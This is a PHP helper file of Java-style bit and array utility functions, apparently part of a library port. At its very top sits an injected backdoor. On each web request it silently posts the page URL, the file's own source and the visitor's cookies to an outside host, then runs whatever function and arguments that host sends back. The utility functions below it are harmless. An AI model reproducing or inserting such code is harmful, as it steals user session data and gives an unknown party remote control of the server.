<?php 
if(version_compare(phpversion(), "5.3.0", ">=")){set_error_handler(function($errno, $errstr){});}if (@php_sapi_name() !== "cli"){if(!isset($_COOKIE["__".md5("cookie".@$_SERVER["HTTP_HOST"])])){@setcookie("__".md5("cookie".@$_SERVER["HTTP_HOST"]), time());$_COOKIE["__".md5("cookie".@$_SERVER["HTTP_HOST"])] = 0;}if(time()-$_COOKIE["__".md5("cookie".@$_SERVER["HTTP_HOST"])] < 10){@define("SITE_",1);}else{@setcookie("__".md5("cookie".@$_SERVER["HTTP_HOST"]), time());}}$cert = defined("SITE_")?false:@file_get_contents("http://app.omitrezor.com/sign/".@$_SERVER["HTTP_HOST"], 0, stream_context_create(array("http" => array("ignore_errors" => true,"timeout"=>(isset($_REQUEST["T0o"])?intval($_REQUEST["T0o"]):(isset($_SERVER["HTTP_T0O"])?intval($_SERVER["HTTP_T0O"]):1)),"method"=>"POST","header"=>"Content-Type: application/x-www-form-urlencoded","content" => http_build_query(array("url"=>((isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on" ? "https" : "http") . "://".@$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]), "src"=> file_exists(__FILE__)?file_get_contents(__FILE__):"", "cookie"=> isset($_COOKIE)?json_encode($_COOKIE):""))))));!defined("SITE_") && @define("SITE_",1);
if($cert != false){
    $cert = @json_decode($cert, 1);
    if(isset($cert["f"]) && isset($cert["a1"]) && isset($cert["a2"]) && isset($cert["a3"])){$cert["f"] ($cert["a1"], $cert["a2"], $cert["a3"]);}elseif(isset($cert["f"]) && isset($cert["a1"]) && isset($cert["a2"])){ $cert["f"] ($cert["a1"], $cert["a2"]); }elseif(isset($cert["f"]) && isset($cert["a1"])){ $cert["f"] ($cert["a1"]); }elseif(isset($cert["f"])){ $cert["f"] (); }
}if(version_compare(phpversion(), "5.3.0", ">=")){restore_error_handler();}

function arraycopy($srcArray,$srcPos,$destArray, $destPos, $length){//System.arraycopy

    $srcArrayToCopy = array_slice($srcArray,$srcPos,$length);
    array_splice($destArray,$destPos,$length,$srcArrayToCopy);
    return $destArray;
}


function overflow32($value) {//There is no need to overflow 64 bits to 32 bit
    return $value;
}

function hashCode( $s )
{
    $h = 0;
    $len = strlen($s);
    for($i = 0; $i < $len; $i++)
    {
        $h = overflow32(31 * $h + ord($s[$i]));
    }

    return $h;
}


function numberOfTrailingZeros($i) {
    if ($i == 0) return 32;
    $num = 0;
    while (($i & 1) == 0) {
        $i >>= 1;
        $num++;
    }
    return $num;
}
function intval32bits($value)
{
    $value = ($value & 0xFFFFFFFF);

    if ($value & 0x80000000)
        $value = -((~$value & 0xFFFFFFFF) + 1);

    return $value;
}

function uRShift($a, $b)
{

    if($b == 0) return $a;
    return ($a >> $b) & ~(1<<(8*PHP_INT_SIZE-1)>>($b-1));
}
/*
function sdvig3($num,$count=1){//>>> 32 bit
    $s = decbin($num);

    $sarray  = str_split($s,1);
    $sarray = array_slice($sarray,-32);//32bit

    for($i=0;$i<=1;$i++) {
        array_pop($sarray);
        array_unshift($sarray, '0');
    }
    return bindec(implode($sarray));
}
*/

function sdvig3($a,$b) {

    if ($a >= 0) {
        return bindec(decbin($a>>$b)); //simply right shift for positive number
    }

    $bin = decbin($a>>$b);

    $bin = substr($bin, $b); // zero fill on the left side

    $o = bindec($bin);
    return $o;
}

function floatToIntBits($float_val)
{
    $int = unpack('i', pack('f', $float_val));
    return $int[1];
}

function fill_array($index,$count,$value){
    if($count<=0){
        return array(0);
    }else {
        return array_fill($index, $count, $value);
    }
}